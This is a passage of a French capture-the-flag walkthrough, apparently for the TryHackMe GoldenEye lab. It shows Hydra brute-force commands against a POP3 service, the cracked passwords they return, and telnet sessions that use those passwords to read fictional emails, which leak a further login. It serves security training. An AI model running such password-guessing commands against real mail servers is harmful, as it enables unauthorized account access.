@@ -155,3 +155,229 @@ Ce qui nous donne la réponse à la question suivante.
 <table><thead><tr><th width="505">Question</th><th>Réponse</th></tr></thead><tbody><tr><td>Whats their password?</td><td>InvincibleHack3r</td></tr></tbody></table>
 
 **Nous connaissons maintenant deux utilisateurs, boris et natalya et nous avons un mot de passe pour boris.**
+
+## \[Task 2] Its mail time...
+
+### Firefox
+
+Essayons d'abord de nous connecter via Firefox avec l'utilisateur boris:InvincibleHack3r.
+
+<figure><img src=".gitbook/assets/sev-home.png" alt=""><figcaption><p>sev-home login</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/sev-home-02.png" alt=""><figcaption><p>GoldenEye page index</p></figcaption></figure>
+
+L'analyse du code source de la page ne mène à rien d'exploitable.
+
+Comme suggéré dans le challenge et dans la page index, tentons de nous connecter avec l'utilisateur boris:InvincibleHack3r au serveur pop3 sur le port 55007 trouvé avec nmap .
+
+( [pop3 en ligne de commande](https://www.vircom.com/blog/quick-guide-of-pop3-command-line-to-type-in-telnet/) )
+
+```sh
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ telnet $IP 55007
+Trying 10.10.43.8...
+Connected to 10.10.43.8.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS InvincibleHack3r
+-ERR [AUTH] Authentication failed.
+```
+
+### Hydra
+
+Comme les crédentiels de l'utilisateur boris ne fonctionnent pas pour le serveur pop3, le challenge suggère d'utiliser [Hydra](outils.md#hydra).
+
+Lançons une brute-force hydra pop3 port 55007 avec la wordlist classique rockyou.txt
+
+```sh
+hydra -l boris  -P /usr/share/wordlists/rockyou.txt pop3://$IP -s 55007 -t 64
+```
+
+Au bout de 10 minutes, nous n'avons trouvé aucun password et la commande semble partie pour des heures ! Dans les challenges THM, les attaques brut-force répondent en général en quelques minutes, certainement en moins de 10 minutes. (Tout dépend évidemment de la vitesse de calcul de votre machine.)
+
+Changeons la wordlist et lançons Hydra avec fasttrack.txt en lieu et place de rockyou.txt.
+
+```sh
+hydra -l boris  -P /usr/share/wordlists/fasttrack.txt  pop3://$IP -s 55007 -t 64
+```
+
+```
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ hydra -l boris  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s 55007 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-05 04:55:45
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
+[DATA] attacking pop3://10.10.43.8:55007/
+[55007][pop3] host: 10.10.43.8   login: boris   password: secret1!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-05 04:56:13
+
+```
+
+idem pour natalya
+
+```
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ hydra -l natalya  -P /usr/share/wordlists/fasttrack.txt  pop3://$IP -s 55007 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-05 04:56:27
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
+[DATA] attacking pop3://10.10.43.8:55007/
+[55007][pop3] host: 10.10.43.8   login: natalya   password: bird
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-05 04:56:57
+
+```
+
+### Utilisateurs pop3 trouvés jusqu'à présent
+
+| Utilisateur | Password |
+| ----------- | -------- |
+| boris       | secret1! |
+| natalya     | bird     |
+
+### Réponses aux questions
+
+<table><thead><tr><th width="538">Questions</th><th>Réponses</th></tr></thead><tbody><tr><td>If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?</td><td>secret1!</td></tr><tr><td>Inspect port 55007, what services is configured to use this port?</td><td>telnet</td></tr><tr><td>What can you find on this service?</td><td>emails</td></tr><tr><td>What user can break Boris' codes?</td><td>natalya</td></tr></tbody></table>
+
+### Emails
+
+#### Boris
+
+```sh
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ telnet $IP 55007
+Trying 10.10.43.8...
+Connected to 10.10.43.8.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS secret1!
++OK Logged in.
+LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+RETR 1
++OK 544 octets
+Return-Path: <root@127.0.0.1.goldeneye>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id D9E47454B1
+	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: <20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+.
+RETR 2
++OK 373 octets
+Return-Path: <natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id C3F2B454B1
+	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: <alec@janus.boss>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+.
+
+```
+
+#### Natalya
+
+```sh
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ telnet $IP 55007
+Trying 10.10.43.8...
+Connected to 10.10.43.8.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER natalya
++OK
+PASS bird
++OK Logged in.
+LIST
++OK 2 messages:
+1 631
+2 1048
+.
+RETR 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id D5EDA454B1
+	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+```
+
